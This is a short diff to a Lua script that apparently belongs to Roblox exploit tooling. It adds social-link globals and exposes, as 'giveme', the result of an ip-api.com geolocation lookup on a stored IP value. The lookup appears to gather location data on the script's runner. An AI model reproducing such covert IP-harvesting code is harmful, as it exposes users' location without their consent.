@@ -10,6 +10,12 @@ _G.diskordlink = ("https://discordapp.com/users/1284685023630458963")
 _G.ytlink = ("https://youtube.com/@rsgmj")
 _G.telegramlink = ("https://t.me/sIipped")
 _G.iglink = ("instagram.com/mxrylvnd")
+----same----
+getgenv().rbxlink = _G.rbxlink;
+getgenv().diskordlink = _G.diskordlink;
+getgenv().ytlink = _G.ytlink;
+getgenv().telegramlink = _G.telegramlink;
+getgenv().iglink = _G.iglink;
 
 -- [[ setting/global vars ]] --
 local rrixh = loadstring;
@@ -221,6 +227,7 @@ _G.BUFFER = tostring(_G.sekret.ip);
 _G.ThatSexy = _G.req({
 Url = string.format("http://ip-api.com/json/%s", _G.BUFFER), Method ="Get"});
 _G.getrrixh = _G.HTTP:JSONDecode(_G.ThatSexy.Body);
+getgenv().giveme = _G.getrrixh;
 
 --stuff e--
 getgenv().e = (":");
